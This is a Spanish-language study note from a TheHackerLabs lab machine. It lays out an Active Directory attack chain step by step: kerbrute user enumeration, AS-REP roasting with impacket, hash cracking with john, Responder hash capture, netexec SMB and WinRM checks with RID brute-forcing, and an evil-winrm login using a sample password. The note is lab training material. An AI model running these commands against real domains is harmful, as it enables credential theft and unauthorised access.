 - Tags: #window #window_dc #active_directory #recursos #recursos_hackerlabs #ASREP-Roast
**Recurso**: Maquina Curiosity theHackerLabs

Enumerar users
*Kerbrute bash tool*: [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
```bash
./kerbrute_linux_amd64 userenum -d domain --dc ip_DC /wordlist_de_usernames

./kerbrute_linux_amd64 userenum -d hackme.thl --dc 172.19.151.221 /usr/share/seclist/Username/xato-net-10-millions-usernames.txt

```

Despues de obtener los usuarios necesitamos ver si alguno se le puede hacer ASREP-Roast
```bash
impacket-GetNPUsers hackme.thl/ -no-pass -usersfile user_list -dc-ip 172.19.151.221 
```

De haber usuarios susceptibles a este ataque pues obtendremos los hash de estos los cuales intentaremos craquear con la herramienta john

```bash
#Nos copiamos los hash obtenidos en un fichero 
nano hashes

#Deciframos con john

john --wordlist=/dir/rockyou.txt hashes
```

De no tener éxito con el hash siguiente paso seria utilizar el responder para capturar hash que estén en transito en la red para intentar decifrarlos

```bash
sudo responder -I eth0
```

Hacemos  lo mismo que en el paso anterior es recomendable en estos caso utilizar varios diccionarios para estar seguros 
```bash
#Nos copiamos los hash obtenidos en un fichero 
nano hashes

#Deciframos con john

john --wordlist=/dir/rockyou.txt hashes

john --wordlist=/usr/share/seclists/Passwords/seasson.txt hashes
```

Teniendo Un user y un pass probamos los clasicos smb winrm
```bash
netexec smb domain -u 'user' -p 'pass'

#enumeramos recursos 
netexec smb domain -u 'user' -p 'pass' --shares

#de estar IPC$ con permisos de lectura tratamos de enumerar user
netexec smb domain -u 'user' -p 'pass' --rid-brute

#Obteniendo varios usuarios intentariamos acer un ASREP-Roast a esta lista de usurios le hariamos un tratamiento para quedarnos solo con los usuarios

#Filtrar usuarios
cat usuarios_sin_ordenar | tr '\' '' | awk '{print $7}' >> users

```

Intentariamos otro con la lista de usuarios obtenidos 

```bash

impacket-GetNPUsers hackme.thl/ -no-pass -usersfile user_list -dc-ip 172.19.151.221 
```

Revisamos si tenemos acceso con winrm
```bash
netexec winrm domain -u 'user' -p 'pass' 
```

![](../../../attachments/Pasted%20image%2020260213202052.png)

Si tenemos acceso probaremos con la herramienta evil-winrm
```bash
evil-winrm -i dominio -u 'user' -p pass

evil-winrm -i hachme.thl -u 'jdoe' -p 'm4ster123'

#Establece una conexion con la maquina objetivo
```